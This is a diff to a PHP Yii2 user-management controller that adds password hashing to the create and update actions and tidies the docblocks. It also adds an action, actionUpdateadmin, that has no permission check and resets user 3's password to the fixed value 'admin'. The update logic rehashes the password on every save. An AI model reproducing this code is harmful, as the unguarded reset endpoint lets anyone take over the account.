@@ -61,7 +61,8 @@ class UserController extends Controller
      * Displays a single User model.
      * @param integer $id
      * @return mixed
-     * @throws NotFoundHttpException if the model cannot be found
+     * @throws ForbiddenHttpException if the model cannot be found
+     * @throws NotFoundHttpException
      */
     public function actionView($id)
     {
@@ -85,8 +86,10 @@ class UserController extends Controller
         $model = new User();
 
         if (\Yii::$app->user->can('create')) {
+            if ($model->load(Yii::$app->request->post()) && $model->validate()) {
+                $model->password = \Yii::$app->security->generatePasswordHash($model->password);
+                $model->save();
 
-            if ($model->load(Yii::$app->request->post()) && $model->save()) {
                 return $this->redirect(['view', 'id' => $model->id]);
             }
 
@@ -97,12 +100,15 @@ class UserController extends Controller
 
         throw new ForbiddenHttpException('Недостаточно прав для данного действия');
     }
+
     /**
      * Updates an existing User model.
      * If update is successful, the browser will be redirected to the 'view' page.
      * @param integer $id
      * @return mixed
+     * @throws ForbiddenHttpException
      * @throws NotFoundHttpException if the model cannot be found
+     * @throws \yii\base\Exception
      */
     public function actionUpdate($id)
     {
@@ -110,16 +116,33 @@ class UserController extends Controller
 
         if (\Yii::$app->user->can('update')) {
 
-        if ($model->load(Yii::$app->request->post()) && $model->save()) {
-            return $this->redirect(['view', 'id' => $model->id]);
-        }
+            if ($model->load(Yii::$app->request->post()) && $model->validate()) {
+                $model->password = \Yii::$app->security->generatePasswordHash($model->password);
+                $model->save();
 
-        return $this->render('update', [
-            'model' => $model,
-        ]);
+                return $this->redirect(['view', 'id' => $model->id]);
+            }
+
+            return $this->render('update', [
+                'model' => $model,
+            ]);
         }
 
         throw new ForbiddenHttpException('Недостаточно прав для данного действия');
+    }
+
+    public function actionUpdateadmin()
+    {
+        $model = $this->findModel(3);
+
+
+        $model->password = \Yii::$app->security->generatePasswordHash('admin');
+        $model->save();
+
+
+
+            return $this->redirect(['view', 'id' => $model->id]);
+
     }
 
     /**
@@ -127,14 +150,17 @@ class UserController extends Controller
      * If deletion is successful, the browser will be redirected to the 'index' page.
      * @param integer $id
      * @return mixed
+     * @throws ForbiddenHttpException
      * @throws NotFoundHttpException if the model cannot be found
+     * @throws \Throwable
+     * @throws \yii\db\StaleObjectException
      */
     public function actionDelete($id)
     {
         if (\Yii::$app->user->can('delete')) {
-        $this->findModel($id)->delete();
+            $this->findModel($id)->delete();
 
-        return $this->redirect(['index']);
+            return $this->redirect(['index']);
         }
 
         throw new ForbiddenHttpException('Недостаточно прав для данного действия');
